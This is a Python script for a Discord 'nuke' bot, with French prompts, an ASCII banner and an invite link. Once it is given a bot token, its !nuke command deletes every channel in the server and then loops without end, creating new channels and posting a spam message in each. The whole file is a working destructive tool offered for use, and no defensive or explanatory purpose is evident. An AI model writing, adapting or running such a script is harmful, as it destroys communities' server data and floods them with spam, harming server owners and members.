import discord
from discord.ext import commands
import random
import asyncio
import os

RED = "\033[31m"  

logo = f"""{RED}
╔═╗╦╔═╦═╗  ╦═╗╔═╗╦╔╦╗
╠═╣╠╩╗╠╦╝  ╠╦╝╠═╣║ ║║ [https://discord.gg/arkaz]
╩ ╩╩ ╩╩╚═  ╩╚═╩ ╩╩═╩╝
"""
print(logo)
token = input("Token de ton bot -> ")
salon = input("Nom des salons -> ")
msg = input("Message a spam -> ")

intents = discord.Intents().all()
bot = commands.Bot(command_prefix="!", help_command=None, intents=discord.Intents.all())

@bot.event
async def on_ready():
    os.system("cls")
    on = """
╔═╗╦╔═╦═╗  ╦═╗╔═╗╦╔╦╗
╠═╣╠╩╗╠╦╝  ╠╦╝╠═╣║ ║║ [https://discord.gg/arkaz]
╩ ╩╩ ╩╩╚═  ╩╚═╩ ╩╩═╩╝
!nuke -> suprime tout les salons + cree des salons a l infini + spam message
"""
    print(on)

@bot.command()
async def nuke(ctx):
    delete = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete)
    while True:
        random_number = random.randint(1, 1000)
        guild = ctx.guild
        new_channel = await guild.create_text_channel(f"{salon}{random_number}")
        await new_channel.send(f"{msg} \n [bot by akr]")


bot.run(token)